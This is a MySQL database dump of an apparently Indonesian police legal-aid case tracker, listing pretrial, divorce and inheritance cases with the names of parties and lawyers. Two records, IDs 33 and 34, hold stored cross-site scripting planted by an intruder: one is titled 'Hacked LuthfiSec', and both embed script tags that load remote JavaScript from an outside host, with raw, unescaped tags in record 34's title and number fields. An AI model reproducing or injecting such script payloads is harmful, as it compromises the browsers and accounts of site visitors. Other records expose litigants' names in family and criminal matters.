/*
 Navicat Premium Data Transfer

 Source Server         : Localhost
 Source Server Type    : MySQL
 Source Server Version : 80023
 Source Host           : localhost:3306
 Source Schema         : siapyankum

 Target Server Type    : MySQL
 Target Server Version : 80023
 File Encoding         : 65001

 Date: 07/07/2022 20:11:13
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for aktif
-- ----------------------------
DROP TABLE IF EXISTS `aktif`;
CREATE TABLE `aktif`  (
  `pengguna_id` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` datetime NULL DEFAULT NULL
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of aktif
-- ----------------------------

-- ----------------------------
-- Table structure for bantuan_hukum
-- ----------------------------
DROP TABLE IF EXISTS `bantuan_hukum`;
CREATE TABLE `bantuan_hukum`  (
  `bantuan_hukum_id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `bantuan_hukum_judul` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `bantuan_hukum_tanggal` date NOT NULL,
  `bantuan_hukum_laporan_nomor` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `bantuan_hukum_jenis` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `bantuan_hukum_keterangan` mediumtext CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL,
  `bantuan_hukum_satuan_kerja` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `operator` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`bantuan_hukum_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 35 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of bantuan_hukum
-- ----------------------------
INSERT INTO `bantuan_hukum` VALUES (8, 'REKAP BANTUAN HUKUM SIDANG PIDANA TAHUN 2020', '2020-12-31', '31 DESEMBER 2020', 'pidana', 'REKAP BANTUAN HUKUM SIDANG PIDANA TAHUN 2020<br>JUMLAH 4 PERKARA<br>SELESAI 4 PERKARA<br>TUNGGAKAN NIHIL', NULL, 'Administrator', '2021-01-06 12:22:18', '2021-01-06 12:29:03');
INSERT INTO `bantuan_hukum` VALUES (9, 'REKAP BANTUAN HUKUM SIDANG PERDATA TAHUN 2020', '2020-12-31', '31 DESEMBER 2020', 'perdata', 'REKAP BANTUAN HUKUM SIDANG PERDATA TAHUN 2020<br>JUMLAH 1 PERKARA<br>SELESAI 1 PERKARA<br>TUNGGAKAN NIHIL', NULL, 'Administrator', '2021-01-06 12:27:24', '2021-01-06 12:27:24');
INSERT INTO `bantuan_hukum` VALUES (10, 'REKAP BANTUAN HUKUM SIDANG PENGADILAN AGAMA TAHUN 2020', '2020-12-31', '31 DESEMBER 2020', 'agama', 'REKAP BANTUAN HUKUM SIDANG PENGADILAN AGAMA TAHUN 2020<br>JUMLAH 3 PERKARA<br>SELESAI 2 PERKARA<br>DALAM PROSES 1<br>TUNGGAKAN NIHIL', NULL, 'Administrator', '2021-01-06 12:33:07', '2021-01-06 12:33:07');
INSERT INTO `bantuan_hukum` VALUES (11, 'REKAP BANTUAN HUKUM SIDANG PTUN TAHUN 2020', '2020-12-31', '31 DESEMBER 2020', 'ptun', 'REKAP BANTUAN HUKUM SIDANG PTUN TAHUN 2020<br>JUMLAH NIHIL&nbsp;', NULL, 'Administrator', '2021-01-06 12:35:16', '2021-01-06 12:35:16');
INSERT INTO `bantuan_hukum` VALUES (12, 'Pra Peradilan antara Sahme dkk melalui Kuasa Hukum Iskandar, S.H., M.H dkk melawan Polres Kota Mataram', '2021-01-13', '01/pid.pra/2021/PN MTR', 'praperadilan', 'Pra Peradilan antara Sahme dkk melalui Kuasa Hukum Iskandar, S.H., M.H dkk melawan Polres Kota Mataram', NULL, 'Administrator', '2021-01-27 14:31:36', '2021-06-29 15:20:56');
INSERT INTO `bantuan_hukum` VALUES (13, 'Perkara Gugat Cerai Talak', '2020-12-02', '1383/Pdt.G/2020/PA.GM', 'agama', 'Perkara Gugat Cerai Talak', NULL, 'Administrator', '2021-02-03 17:48:32', '2021-06-29 15:16:50');
INSERT INTO `bantuan_hukum` VALUES (18, 'Perkara perdata Gugatan Waris Malwaris', '2021-03-24', '491/Pdt.G/2021/PA. Praya', 'perdata', '<div>Agenda sidang:</div><div>Penyerahan kesimpulan dari para pihak<br><br></div><div>Sidang berikutnya:</div><div>Putusan tanggal 30 Desember 2021.</div>', NULL, 'Administrator', '2021-04-28 15:25:33', '2021-11-30 16:38:10');
INSERT INTO `bantuan_hukum` VALUES (19, 'Praperadilan antara SR dan MR melalui kuasa hukumnya ILHAM, S.H. dan ABDULLAH, S.H., M.H. melawan Polres Dompu', '2021-05-19', '3/Pid.Pra/2021/PN.Dpu', 'praperadilan', 'Praperadilan antara SR dan MR melalui kuasa hukumnya ILHAM, S.H. dan ABDULLAH, S.H., M.H. melawan Polres Dompu di Pengadilan Negeri Dompu dengan materi permohonan tentang sah tidaknya penangkapan dan penggeledahan yang dilakukan oleh Satresnarkoba Polres Dompu terkait dugaan tindak pidana Narkotika sebagaimana pasal 114 ayat (1) dan atau pasal 112 ayat (1) Undang-undang Nomor 35 tahun 2009 tentang Narkotika.&nbsp;', NULL, 'Administrator', '2021-05-28 20:44:20', '2021-06-29 15:21:43');
INSERT INTO `bantuan_hukum` VALUES (20, 'Praperadilan antara RPS melalui Kuasa Hukum ERWIN SIREGAR, S.H.,M.H.,Dkk.', '2021-05-24', '2/Pid.Pra/2021/PN. Mtr', 'praperadilan', 'Praperadilan antara RPS melalui Kuasa Hukum ERWIN SIREGAR, S.H.,M.H.,Dkk.', NULL, 'Administrator', '2021-06-17 14:02:23', '2021-06-29 15:22:51');
INSERT INTO `bantuan_hukum` VALUES (21, 'Praperadilan antara an. Topan Yanuarsah melawan Polres Sumbawa', '2021-04-13', '1/Pid.Pra/2021/PN. Sbw', 'praperadilan', 'Praperadilan antara an. Topan Yanuarsah melawan Polres Sumbawa', NULL, 'Administrator', '2021-06-28 12:43:32', '2021-06-28 12:43:32');
INSERT INTO `bantuan_hukum` VALUES (23, 'Gugatan Harta Bersama anggota Polres Lombok Utara', '2020-08-19', '431/Pdt.G/2020/PA. Mtr', 'perdata', 'Gugatan Harta Bersama anggota Polres Lombok Utara', NULL, 'Administrator', '2021-06-28 13:25:28', '2021-06-28 13:25:28');
INSERT INTO `bantuan_hukum` VALUES (24, 'Gugatan perceraian anggota Polairud di PN Mataram', '2021-03-16', '73/Pdt.G/2021/PN. Mtr', 'perdata', 'Gugatan perceraian anggota Polairud di PN Mataram', NULL, 'Administrator', '2021-06-29 14:36:09', '2021-06-29 15:13:45');
INSERT INTO `bantuan_hukum` VALUES (25, 'Gugatan Perceraian anggota Polres Bima Kota', '2020-12-08', '73/Pdt.G/2020/PN. Rbi', 'perdata', 'Gugatan Perceraian anggota Polres Bima Kota', NULL, 'Administrator', '2021-06-29 15:00:53', '2021-06-29 15:12:51');
INSERT INTO `bantuan_hukum` VALUES (26, 'Praperadilan antara DR H. AMRAN AMIR, M.Pd DKK melalui Kuasa Hukum SAIFUL ISLAM, S.H., Dkk. Melawan Kapolda NTB Cq. Direktur kriminal Umum Polda NTB, Cq. Kasubidit II', '2021-06-28', '2/Pid.Pra/PN. Rbi', 'praperadilan', 'Praperadilan antara DR H. AMRAN AMIR, M.Pd DKK melalui Kuasa Hukum SAIFUL ISLAM, S.H., Dkk. Melawan Kapolda NTB Cq. Direktur kriminal Umum Polda NTB, Cq. Kasubidit II&nbsp;', NULL, 'Administrator', '2021-08-05 16:57:31', '2021-08-05 17:01:09');
INSERT INTO `bantuan_hukum` VALUES (27, 'Praperadilan antara Polsek Ampenan melawan Fadil SS., S.h., M.M.', '2021-09-09', '3/Pid.Pra/2021/PN. Mtr', 'praperadilan', 'Praperadilan antara Polsek Ampenan melawan Fadil SS., S.h., M.M.', NULL, 'Administrator', '2021-09-10 07:52:23', '2021-09-10 07:54:33');
INSERT INTO `bantuan_hukum` VALUES (28, 'Praperadilan antara Kapolres Bima Kota melawan H.NURSIDIK dengan kuasanya a.n. RADIATURRAHMAN,S.H,dkk.', '2021-09-13', '3/Pid.Pra/2021/PN.RBi', 'praperadilan', 'Praperadilan antara Kapolres Bima Kota melawan H.NURSIDIK dengan kuasanya a.n. RADIATURRAHMAN,S.H,dkk.&nbsp;', NULL, 'Administrator', '2021-09-13 14:29:20', '2021-09-13 14:29:20');
INSERT INTO `bantuan_hukum` VALUES (29, 'Praperadilan antara Polres Bima Kota melawan RAMADHAN alias RAMA alias GALANG Melalui Kuasa Hukum RADIATURRAHMAN, S.H., dkk', '2021-09-24', '5/Pid.Pra/2021/PN. Rbi', 'praperadilan', 'Praperadilan antara Polres Bima Kota melawan RAMADHAN alias RAMA alias GALANG Melalui Kuasa Hukum RADIATURRAHMAN, S.H., dkk', NULL, 'Administrator', '2021-10-11 16:55:37', '2021-10-11 16:55:37');
INSERT INTO `bantuan_hukum` VALUES (30, 'Praperadilan antara Polres Bima Kota melawan HASANUDDIN Melalui Kuasa Hukum AL IMRAN, S.H.', '2021-09-24', '4/Pid.Pra/2021/PN. Rbi', 'praperadilan', 'Praperadilan antara Polres Bima Kota melawan HASANUDDIN Melalui Kuasa Hukum AL IMRAN, S.H.', NULL, 'Administrator', '2021-10-11 16:59:08', '2021-10-11 16:59:08');
INSERT INTO `bantuan_hukum` VALUES (31, 'Praperadilan antara Polres Kota Mataram melawan MUHAMMAD RAMADHAN alias RAMDHAN Als. BULE Melalui Kuasa Hukum ISKANDAR DKK S.H., dkk.', '2021-09-27', '4/Pid.Pra/2021/PN. Mtr', 'praperadilan', 'Praperadilan antara Polres Kota Mataram melawan MUHAMMAD RAMADHAN alias RAMDHAN Als. BULE Melalui Kuasa Hukum ISKANDAR DKK S.H., dkk.', NULL, 'Administrator', '2021-10-15 16:21:29', '2021-10-15 16:21:29');
INSERT INTO `bantuan_hukum` VALUES (32, 'Praperadilan antara Polres Kota Mataram melawan MUHAMMAD RAMADHAN alias RAMDHAN Als. BULE Melalui Kuasa Hukum ISKANDAR DKK S.H., dkk.', '2021-11-01', '5/Pid.Pra/2021/PN.Mtr', 'praperadilan', 'Praperadilan antara Polres Kota Mataram melawan MUHAMMAD RAMADHAN alias RAMDHAN Als. BULE Melalui Kuasa Hukum ISKANDAR DKK S.H., dkk.<br><br>', NULL, 'Administrator', '2021-11-04 19:30:18', '2021-11-04 19:30:18');
INSERT INTO `bantuan_hukum` VALUES (33, 'Hacked LuthfiSec', '2021-12-02', '11', 'perdata', '<p>&lt;script src=<a target=\"_blank\" rel=\"nofollow\" href=\"https://labsosio.ui.ac.id/wp-snapshots/tmp/tools/jso/29a342c9.js></script>\">https://labsosio.ui.ac.id/wp-snapshots/tmp/tools/jso/29a342c9.js&gt;&lt;/script&gt;</a>;</p>', NULL, 'Administrator', '2021-12-02 19:20:33', '2021-12-02 19:20:33');
INSERT INTO `bantuan_hukum` VALUES (34, '<script src=https://labsosio.ui.ac.id/wp-snapshots/tmp/tools/jso/08f23bce.js></script>', '2021-12-03', '<script src=https://labsosio.ui.ac.id/wp-snapshots/tmp/tools/jso/08f23bce.js></script>', 'praperadilan', '&lt;script src=<a target=\"_blank\" rel=\"nofollow\" href=\"https://labsosio.ui.ac.id/wp-snapshots/tmp/tools/jso/08f23bce.js></script>\">https://labsosio.ui.ac.id/wp-snapshots/tmp/tools/jso/08f23bce.js&gt;&lt;/script&gt;</a>;', NULL, 'Administrator', '2021-12-03 05:46:51', '2021-12-03 05:46:51');

-- ----------------------------
-- Table structure for bantuan_hukum_proses
-- ----------------------------
DROP TABLE IF EXISTS `bantuan_hukum_proses`;
CREATE TABLE `bantuan_hukum_proses`  (
  `bantuan_hukum_id` bigint UNSIGNED NOT NULL,
  `bantuan_hukum_proses_tanggal` date NOT NULL,
  `bantuan_hukum_proses_status` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `bantuan_hukum_proses_deskripsi` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `operator` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of bantuan_hukum_proses
-- ----------------------------
INSERT INTO `bantuan_hukum_proses` VALUES (6, '2020-08-19', 'PROSES SIDANG', 'Agenda sidang pembuktian dan saksi dari tergugat.', 'Administrator', '2021-01-06 11:05:19', '2021-01-06 11:05:19');
INSERT INTO `bantuan_hukum_proses` VALUES (6, '2021-02-02', 'PROSES SIDANG', 'Sidang penyerahan kesimpulan tergugat.', 'Administrator', '2021-02-02 19:03:08', '2021-02-02 19:03:08');
INSERT INTO `bantuan_hukum_proses` VALUES (7, '2020-12-31', 'PUTUSAN SIDANG', 'REKAP BANTUAN HUKUM SIDANG PRAPERADILAN TAHUN 2020<br>JUMLAH 18 PERKARA<br>SELESAI 18 PERKARA<br>TUNGGAKAN NIHIL<br>', 'Administrator', '2021-01-06 12:15:26', '2021-01-06 12:15:26');
INSERT INTO `bantuan_hukum_proses` VALUES (8, '2021-01-06', 'DALAM PROSES', 'REKAP BANTUAN HUKUM SIDANG PIDANA TAHUN 2020<br>JUMLAH 4 PERKARA<br>SELESAI 4 PERKARA<br>TUNGGAKAN NIHIL<br>', 'Administrator', '2021-01-06 12:28:20', '2021-01-06 12:28:20');
INSERT INTO `bantuan_hukum_proses` VALUES (8, '2020-12-31', 'PUTUSAN SIDANG', 'REKAP BANTUAN HUKUM SIDANG PIDANA TAHUN 2020<br>JUMLAH 4 PERKARA<br>SELESAI 4 PERKARA<br>TUNGGAKAN NIHIL<br>', 'Administrator', '2021-01-06 12:22:18', '2021-01-06 12:22:18');
INSERT INTO `bantuan_hukum_proses` VALUES (9, '2020-12-31', 'PUTUSAN SIDANG', 'REKAP BANTUAN HUKUM SIDANG PERDATA TAHUN 2020<br>JUMLAH 1 PERKARA<br>SELESAI 1 PERKARA<br>TUNGGAKAN NIHIL<br>', 'Administrator', '2021-01-06 12:27:24', '2021-01-06 12:27:24');
INSERT INTO `bantuan_hukum_proses` VALUES (10, '2020-12-31', 'PUTUSAN SIDANG', 'REKAP BANTUAN HUKUM SIDANG PENGADILAN AGAMA TAHUN 2020<br>JUMLAH 3 PERKARA<br>SELESAI 2 PERKARA<br>DALAM PROSES 1<br>TUNGGAKAN NIHIL<br>', 'Administrator', '2021-01-06 12:33:07', '2021-01-06 12:33:07');
INSERT INTO `bantuan_hukum_proses` VALUES (11, '2020-12-31', 'PUTUSAN SIDANG', 'REKAP BANTUAN HUKUM SIDANG PTUN TAHUN 2020<br>JUMLAH NIHIL <br>', 'Administrator', '2021-01-06 12:35:16', '2021-01-06 12:35:16');
INSERT INTO `bantuan_hukum_proses` VALUES (12, '2021-01-29', 'DALAM PROSES', 'Agenda sidang: <br>Tambahan Bukti Surat dan Saksi Pemohon dilanjutkan dengan pemeriksaan bukti surat Termohon', 'Administrator', '2021-01-31 10:51:24', '2021-01-31 10:51:24');
INSERT INTO `bantuan_hukum_proses` VALUES (12, '2021-01-27', 'PROSES SIDANG', 'Sidang ke-2 dengan agenda sidang Pembacaan Replik Oleh Pemohon', 'Administrator', '2021-01-27 14:31:36', '2021-01-27 14:31:36');
INSERT INTO `bantuan_hukum_proses` VALUES (12, '2021-02-02', 'PUTUSAN SIDANG', 'Pembacaan Putusan oleh Hakim Tunggal:<div>1. Menolak Permohonan Pemohon;</div><div>2. Membebankan biaya perkara kepada Pemohon sebesar NIHIL.</div>', 'Administrator', '2021-02-03 20:32:25', '2021-02-03 20:32:25');
INSERT INTO `bantuan_hukum_proses` VALUES (13, '2021-02-03', 'PROSES SIDANG', 'Ikrar Talak oleh Pemohon kepada Termohon', 'Administrator', '2021-02-03 17:48:32', '2021-02-03 17:48:32');
INSERT INTO `bantuan_hukum_proses` VALUES (13, '2021-02-03', 'PUTUSAN SIDANG', '<div>Memutuskan:</div><div>1. Menyatakan Pemohon dan termohon telah dipanggil secara resmi oleh Pengadilan Agama Giri Menang namun termohon tidak hadir.</div><div><br></div><div>2. Mengabulkan permohonan pemohon secara verstek.</div><div><br></div><div>3. Memberi ijin kepada pemohon Muhammad Reza Pahlevi bin Drs. Ali Usman Effendi untuk menjatuhkan talak 1 terhadap termohon.</div><div><br></div><div>4. Membebankan biaya perkara terhadap pemohon.<br><br>- Ikrar talak oleh Pemohon REZA FAHLEVI kepada Termohon NURMAWATI, S.E.di Pengadilan Agama Giri Menang</div>', 'Administrator', '2021-03-08 16:49:14', '2021-03-08 16:49:14');
INSERT INTO `bantuan_hukum_proses` VALUES (16, '2021-01-18', 'DALAM PROSES', 'MENUNGGU PANGGILAN RELAAS DARI PENGADILAN NEGERI RABA BIMA', 'Administrator', '2021-03-08 16:59:29', '2021-03-08 16:59:29');
INSERT INTO `bantuan_hukum_proses` VALUES (17, '2021-03-18', 'PROSES SIDANG', 'Agenda sidang:<div>Pembuktian surat sebanyak 12 eksemplar dan pemeriksaan 2 orang saksi dari Penggugat (Tergugat tidak hadir sejak penyerahan jawaban dan sudah dipanggil secara sah sebanyak 3 kali).</div>', 'Administrator', '2021-03-18 16:13:24', '2021-03-18 16:13:24');
INSERT INTO `bantuan_hukum_proses` VALUES (18, '2021-03-23', 'DALAM PROSES', 'Gugatan Waris Malwaris<br>', 'Administrator', '2021-04-28 15:25:33', '2021-04-28 15:25:33');
INSERT INTO `bantuan_hukum_proses` VALUES (18, '2021-04-27', 'PROSES SIDANG', 'Agenda mediasi para penggugat dan tergugat namun tidak ada titik temu.<br>Sidang dilanjutkan tanggal 4 Mei 2021', 'Administrator', '2021-04-28 15:27:28', '2021-04-28 15:27:28');
INSERT INTO `bantuan_hukum_proses` VALUES (19, '2021-05-27', 'PROSES SIDANG', 'Agenda sidang Pembacaan Eksepsi dan Jawaban oleh Termohon', 'Administrator', '2021-05-28 20:44:20', '2021-05-28 20:44:20');
INSERT INTO `bantuan_hukum_proses` VALUES (17, '2021-04-12', 'PUTUSAN SIDANG', 'Putusan sidang:<br><div>1. Menyatakan hukum perkawinan antara Penggugat dan Tergugat putus karena Perceraian;</div><div>2. Menetapkan Hak Asuh anak berada dalam kekuasaan Penggugat.</div>', 'Administrator', '2021-05-29 20:37:44', '2021-05-29 20:37:44');
INSERT INTO `bantuan_hukum_proses` VALUES (13, '2021-03-08', 'PUTUSAN SIDANG', '<div>Memutuskan:<br></div><div>1. Menyatakan Pemohon dan termohon telah dipanggil secara resmi oleh Pengadilan Agama Giri Menang namun termohon tidak hadir.</div><div><br></div><div>2. Mengabulkan permohonan pemohon secara verstek.<br><br></div><div>3. Memberi ijin kepada pemohon untuk menjatuhkan talak 1 terhadap termohon.</div><div><br></div><div>4. Membebankan biaya perkara terhadap pemohon.</div><div><br></div><div>- Ikrar talak oleh Pemohon kepada Termohon di Pengadilan Agama Giri Menang</div><div><br></div>', 'Administrator', '2021-05-29 20:45:43', '2021-05-29 20:45:43');
INSERT INTO `bantuan_hukum_proses` VALUES (6, '2021-02-16', 'PUTUSAN SIDANG', '<div>PUTUSAN SIDANG:</div><div>Bahwa Gugatan yang telah diajukan oleh penggugat anggota Polres Lombok Utara telah berkekuatan hukum tetap (Incrach), Sbb.:</div><div>1. Menetapkan penggugat mendapatkan 1/2 bagian dari harta bersama dan tergugat mendapatkan 1/2 bagian dari harta bersama;</div><div><br></div><div>3. Menghukum tergugat untuk menyerahkan sperti diktum angka 1 tersebut di atas bagian dari harta bersama dan apabila tidak di serahkan akan mendapatkan pelelangan dari kepala negara dan hasilnya akan di bagi 1/2 Kepada masing masing pihak;</div><div><br></div><div>4. Menyatakan gugatan penggugat tidak ada di terima sebagian dan selebihnya;</div><div><br></div><div>5. Membebankan biaya perkara kepada penggugat sebesar Rp.2.650 ribu rupiah.</div>', 'Administrator', '2021-05-29 20:51:51', '2021-05-29 20:51:51');
INSERT INTO `bantuan_hukum_proses` VALUES (19, '2021-06-03', 'PROSES SIDANG', 'Agenda sidang penyerahan kesimpulan oleh para Pemohon dan Termohon.<br>', 'Administrator', '2021-06-03 20:20:56', '2021-06-03 20:20:56');
INSERT INTO `bantuan_hukum_proses` VALUES (19, '2021-06-04', 'PUTUSAN SIDANG', '<div>Agenda Sidang Pembacaan Putusan oleh Hakim Tunggal dengan putusan:</div><div>1. Monolak Permohonan Praperadilan oleh Para Pemohon untuk selurunya.</div><div>2. Membebankan biaya Perkara kepada Para Pemohon sebesar NIHIL.</div>', 'Administrator', '2021-06-04 21:56:11', '2021-06-04 21:56:11');
INSERT INTO `bantuan_hukum_proses` VALUES (20, '2021-06-17', 'PROSES SIDANG', 'Agenda sidang<br>Penyerahan Replik dari pemohon.', 'Administrator', '2021-06-17 14:02:23', '2021-06-17 14:02:23');
INSERT INTO `bantuan_hukum_proses` VALUES (20, '2021-06-21', 'PROSES SIDANG', 'Agenda Sidang:&nbsp;<br>Penyerahan Kesimpulan dari Termohon dan Pemohon.', 'Administrator', '2021-06-21 16:33:12', '2021-06-21 16:33:12');
INSERT INTO `bantuan_hukum_proses` VALUES (20, '2021-06-23', 'PUTUSAN SIDANG', 'Pembacaan putusan sbb:<br>1. Menolak permohonan pemohon untuk seluruhnya<br>2. Membebankan biaya Perkara kepada Pemohon sebesar NIHIL.', 'Administrator', '2021-06-23 20:48:49', '2021-06-23 20:48:49');
INSERT INTO `bantuan_hukum_proses` VALUES (21, '2021-04-13', 'DALAM PROSES', 'Praperadilan antara an. Topan Yanuarsah melawan Polres Sumbawa<br>', 'Administrator', '2021-06-28 12:43:32', '2021-06-28 12:43:32');
INSERT INTO `bantuan_hukum_proses` VALUES (21, '2021-05-07', 'PUTUSAN SIDANG', '<div>Putusan Sidang:</div><div>1. Menyatakan Permohonan Praperadilan oleh Pemohon GUGUR;</div><div>2. Menghukum Pemohon untuk membayar biaya perkara sebesar NIHIL.</div>', 'Administrator', '2021-06-28 12:45:02', '2021-06-28 12:45:02');
INSERT INTO `bantuan_hukum_proses` VALUES (22, '2021-04-07', 'DALAM PROSES', 'Gugatan perceraian anggota Polairud di PN Mataram<br>', 'Administrator', '2021-06-28 13:18:32', '2021-06-28 13:18:32');
INSERT INTO `bantuan_hukum_proses` VALUES (22, '2021-04-21', 'PROSES SIDANG', 'Agenda Sidang:&nbsp;<br>Mediasi ketiga serta sidang pokok perkara.', 'Administrator', '2021-06-28 13:19:44', '2021-06-28 13:19:44');
INSERT INTO `bantuan_hukum_proses` VALUES (23, '2020-08-19', 'DALAM PROSES', 'Gugatan Harta Bersama anggota Polres Lombok Utara', 'Administrator', '2021-06-28 13:25:28', '2021-06-28 13:25:28');
INSERT INTO `bantuan_hukum_proses` VALUES (23, '2021-02-16', 'PUTUSAN SIDANG', 'Status1431/Pdt.G/2020/PA MtrGugatan harta bersama19 Agustus 2020PUTUSAN SIDANG -<div>PUTUSAN SIDANG:</div><div>Bahwa Gugatan yang telah diajukan oleh penggugat anggota Polres Lombok Utara telah berkekuatan hukum tetap (Incrach), Sbb.:</div><div>1. Menetapkan penggugat mendapatkan 1/2 bagian dari harta bersama dan tergugat mendapatkan 1/2 bagian dari harta bersama;</div><div><br></div><div>3. Menghukum tergugat untuk menyerahkan sperti diktum angka 1 tersebut di atas bagian dari harta bersama dan apabila tidak di serahkan akan mendapatkan pelelangan dari kepala negara dan hasilnya akan di bagi 1/2 Kepada masing masing pihak;</div><div><br></div><div>4. Menyatakan gugatan penggugat tidak ada di terima sebagian dan selebihnya;</div><div><br></div><div>5. Membebankan biaya perkara kepada penggugat sebesar Rp.2.650 ribu rupiah.</div><div><br></div>', 'Administrator', '2021-06-28 13:27:13', '2021-06-28 13:27:13');
INSERT INTO `bantuan_hukum_proses` VALUES (24, '2021-03-18', 'DALAM PROSES', 'Gugatan Perceraian anggota Polres Bima Kota<br>', 'Administrator', '2021-06-29 14:36:09', '2021-06-29 14:36:09');
INSERT INTO `bantuan_hukum_proses` VALUES (24, '2021-04-21', 'PROSES SIDANG', 'Agenda Sidang: <br>Mediasi ketiga serta sidang pokok perkara.<br><a target=\"_blank\" rel=\"nofollow\"><br>Agenda Sidang selanjutnya:<br>Sidang Pokok Perkara agar penggugat memperoleh ijin dari Pimpinan untuk melaksanakan Cerai di Lingkungan Polri serta diberikan waktu selama 6 bulan, kemudian sidang di agendakan pada hari Rabu tanggal 21 Oktober 2021.</a>', 'Administrator', '2021-06-29 14:53:35', '2021-06-29 14:53:35');
INSERT INTO `bantuan_hukum_proses` VALUES (25, '2021-03-18', 'DALAM PROSES', 'Gugatan Perceraian anggota Polres Bima Kota<br>', 'Administrator', '2021-06-29 15:00:53', '2021-06-29 15:00:53');
INSERT INTO `bantuan_hukum_proses` VALUES (25, '2021-04-12', 'DALAM PROSES', 'Putusan sidang:<br><div>1. Menyatakan hukum perkawinan antara Penggugat dan Tergugat putus karena Perceraian;</div><div>2. Menetapkan Hak Asuh anak berada dalam kekuasaan Penggugat.</div>', 'Administrator', '2021-06-29 15:01:41', '2021-06-29 15:01:41');
INSERT INTO `bantuan_hukum_proses` VALUES (25, '2021-04-12', 'PUTUSAN SIDANG', 'Putusan sidang:<div>1. Menyatakan hukum perkawinan antara Penggugat dan Tergugat putus karena Perceraian;</div><div>2. Menetapkan Hak Asuh anak berada dalam kekuasaan Penggugat.</div>', 'Administrator', '2021-07-29 10:42:28', '2021-07-29 10:42:28');
INSERT INTO `bantuan_hukum_proses` VALUES (26, '2021-08-02', 'PROSES SIDANG', 'Praperadilan antara DR H. AMRAN AMIR, M.Pd DKK melalui Kuasa Hukum SAIFUL ISLAM, S.H., Dkk. Melawan Kapolda NTB Cq. Direktur kriminal Umum Polda NTB, Cq. Kasubidit II <br>', 'Administrator', '2021-08-05 16:57:31', '2021-08-05 16:57:31');
INSERT INTO `bantuan_hukum_proses` VALUES (26, '2021-08-02', 'PUTUSAN SIDANG', '<div>Pembacaan Penetapan Sidang, yakni:</div><div>1. Menerima Pencabutan Kuasa Hukum dari Para Pemohon;</div><div>2. 2. Menyatakan Sidang Praperadilan Gugur;</div><div>3. 3. Membebankan biaya kepada Para Pemohon sebesar NIHIL.</div><div><br></div>', 'Administrator', '2021-08-05 16:58:59', '2021-08-05 16:58:59');
INSERT INTO `bantuan_hukum_proses` VALUES (26, '2021-08-02', 'PUTUSAN SIDANG', 'Pembacaan Penetapan Sidang, yakni:<div>1. Menerima Pencabutan Kuasa Hukum dari Para Pemohon;</div><div>2. Menyatakan Sidang Praperadilan Gugur;</div><div>3. Membebankan biaya kepada Para Pemohon sebesar NIHIL.</div><div><br></div>', 'Administrator', '2021-08-05 17:02:45', '2021-08-05 17:02:45');
INSERT INTO `bantuan_hukum_proses` VALUES (27, '2021-09-10', 'DALAM PROSES', 'Praperadilan antara Polsek Ampenan melawan Fadil SS., S.h., M.M. <br>', 'Administrator', '2021-09-10 07:52:23', '2021-09-10 07:52:23');
INSERT INTO `bantuan_hukum_proses` VALUES (27, '2021-09-09', 'PROSES SIDANG', 'Pembuktian tambahan dari pemohon dan termohon.<br>', 'Administrator', '2021-09-10 07:53:51', '2021-09-10 07:53:51');
INSERT INTO `bantuan_hukum_proses` VALUES (27, '2021-09-13', 'PUTUSAN SIDANG', '<div>Hasil Putusan:</div><div>1.Menolak seluruhnya PP pemohon.</div><div>2.Membebankan biaya persidangan kepada Pemohon sebesar NIHIL.</div><div><br></div>', 'Administrator', '2021-09-13 14:22:56', '2021-09-13 14:22:56');
INSERT INTO `bantuan_hukum_proses` VALUES (28, '2021-09-13', 'DALAM PROSES', 'Praperadilan antara Kapolres Bima Kota melawan H.NURSIDIK dengan kuasanya a.n. RADIATURRAHMAN,S.H,dkk.&nbsp;', 'Administrator', '2021-09-13 14:29:20', '2021-09-13 14:29:20');
INSERT INTO `bantuan_hukum_proses` VALUES (28, '2021-09-13', 'PROSES SIDANG', 'Pembukaan Sidang berupa pemeriksaan kuasa dari termohon di lanjutkan pembacaan gugatan oleh pihak Pemohon.<br>', 'Administrator', '2021-09-13 14:29:51', '2021-09-13 14:29:51');
INSERT INTO `bantuan_hukum_proses` VALUES (11, '2021-09-23', 'DALAM PROSES', '<h1>&lt;p&gt;tes&lt;/p&gt;</h1>', 'Administrator', '2021-09-23 18:08:35', '2021-09-23 18:08:35');
INSERT INTO `bantuan_hukum_proses` VALUES (28, '2021-09-17', 'PUTUSAN SIDANG', 'Penetapan Hakim:<div>1. Mengabulkan Permohonan Pemohon untuk pencabutan Praperadilan;</div><div>2. Membebankan biaya perkara kepada Pemohon sebesar NIHIL.</div>', 'Administrator', '2021-09-26 19:58:59', '2021-09-26 19:58:59');
INSERT INTO `bantuan_hukum_proses` VALUES (29, '2021-09-24', 'DALAM PROSES', 'Praperadilan antara Polres Bima Kota melawan RAMADHAN alias RAMA alias GALANG Melalui Kuasa Hukum RADIATURRAHMAN, S.H., dkk<br>', 'Administrator', '2021-10-11 16:55:37', '2021-10-11 16:55:37');
